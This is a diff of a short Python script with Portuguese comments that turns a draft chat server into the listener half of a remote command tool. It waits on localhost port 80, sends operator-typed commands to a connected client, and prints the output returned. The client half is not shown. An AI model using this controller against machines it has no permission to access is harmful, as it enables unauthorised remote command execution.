@@ -1,58 +1,38 @@
-import threading 
 import socket
-import os
-
-from setuptools import Command
-
-clients = []
 
 def main():
-
+    #criando socket tcp 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        ip = 'localhost'
-        porta = 80
-        BUFFER_SIZE = 1024 * 128
-        server.bind((ip, porta))
+        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+        server.bind(('localhost', 80)) 
         server.listen(10)
-
-        client, addr = server.accept()
-        print(addr)
-        clients.append(client)
-
-        print(f"Ouvindo no ip {ip} na porta {porta}")
-
-          #recebendo o diretório de trabalho atual do cliente
-        cwd = client.recv(BUFFER_SIZE).decode()
-        print("Diretório de trabalho atual:\n", cwd)
-
-    except  Exception as ex:
-        return print(f'\n Não foi possível iniciar o servidor: {str(ex)}.\n')
-
-
+        print("Ouvindo: ...")
+    except:
+        return print('\n Não foi possível iniciar o servidor \n')
 
     while True:
-       Command = input =(f"{cwd} $> ")
+        # aceita qualquer tentativa de conexão 
+        client, client_address = server.accept() 
+        print(f"{client_address[0]}:{client_address[1]} Connected!")
 
-def messagesTreatment(client):
-    while True:
-        try:
-            msg = client.recv(2048)
-            send_for_all_clients(msg, client)
-        except:
-            deleteClient(client)
-            break
+        #recebe as mensagens do servidor
+        messages(client,server)
 
-def send_for_all_clients(msg, c_client):
-    for client in clients:
-      if client != c_client:
-        try:
-            client.send(msg)
-        except:
-            deleteClient(client)
+def messages(client, server):
+    while True: 
+        # obtém o comando do prompt 
+        cmd = input("Digite o comando que você deseja executar: \n") 
+        if cmd.lower() == "exit":
+            # se o comando for exit, apenas saia do loop 
+            break 
 
-def deleteClient(client):
+        # envia o comando para o cliente 
+        client.send(cmd.encode()) 
+        # recupera os resultados do comando 
+        msg = client.recv(2048).decode() 
+        print(msg) 
+
     client.close()
-    clients.remove(client)
 
 main()
